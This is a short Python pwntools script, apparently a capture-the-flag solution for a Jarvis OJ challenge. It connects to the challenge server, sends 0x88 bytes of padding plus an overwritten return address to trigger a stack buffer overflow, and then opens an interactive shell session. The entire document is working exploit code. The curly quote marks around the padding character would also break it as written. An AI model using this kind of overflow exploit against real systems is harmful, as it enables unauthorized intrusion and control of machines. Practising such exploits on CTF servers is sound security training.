# -*- coding:utf-8 -*-
from pwn import *

sh = remote("pwn2.jarvisoj.com",9881)
junk = ‘a‘*0x88
syscall = 0x00400596
payload = junk  + p64(syscall) 
sh.send(payload)
sh.interactive() 
